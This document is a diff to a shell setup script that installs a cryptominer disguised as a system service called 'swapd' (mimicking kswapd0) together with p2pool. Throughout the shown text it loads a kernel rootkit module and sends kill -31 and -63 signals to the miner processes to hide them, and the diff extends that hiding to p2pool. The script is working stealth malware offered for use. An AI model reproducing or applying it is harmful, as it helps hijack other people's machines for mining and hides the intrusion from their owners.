@@ -583,27 +583,6 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOF
 
-# ======== FINAL SETUP STEPS ========
-echo "[*] Starting services..."
-sudo systemctl daemon-reload
-sudo systemctl enable --now p2pool
-sudo systemctl enable --now swapd
-
-echo "[*] Verification commands:"
-echo "P2Pool status: sudo journalctl -u p2pool -f"
-echo "Miner status: sudo journalctl -u swapd -f"
-echo "Network ports: ss -tulpn | grep -E '3333|37889'"
-
-
-echo "[*] hid1ng... ;)"
-
-kill -31 $(pgrep -f -u root config.json)
-
-kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
-#kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
-
-kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}') :
-#kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
@@ -719,19 +698,30 @@ dmesg -C && insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
+echo "[*] hid1ng... ;)"
 
-systemctl status swapd
-systemctl start swapd
-systemctl status swapd
+# ======== FINAL SETUP STEPS ========
+echo "[*] Starting services..."
+sudo systemctl daemon-reload
+sudo systemctl enable --now p2pool
+sudo systemctl enable --now swapd
 
-#systemctl restart p2pool
-#systemctl status p2pool
+echo "[*] Verification commands:"
+echo "P2Pool status: sudo journalctl -u p2pool -f"
+echo "Miner status: sudo journalctl -u swapd -f"
+echo "Network ports: ss -tulpn | grep -E '3333|37889'"
+
 
 kill -31 $(pgrep -f -u root config.json) &
 kill -31 $(pgrep -f -u root config_background.json) &
 kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
-kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
+kill -31 `/bin/ps ax -fu $USER| grep "p2pool" | grep -v "grep" | awk '{print $2}'` &
 kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
-kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
+kill -63 `/bin/ps ax -fu $USER| grep "p2pool" | grep -v "grep" | awk '{print $2}'` &
+
+systemctl status swapd
+
+ps ax|grep swapd
+ps ax|grep p2pool
 
 echo "[*] Setup complete"
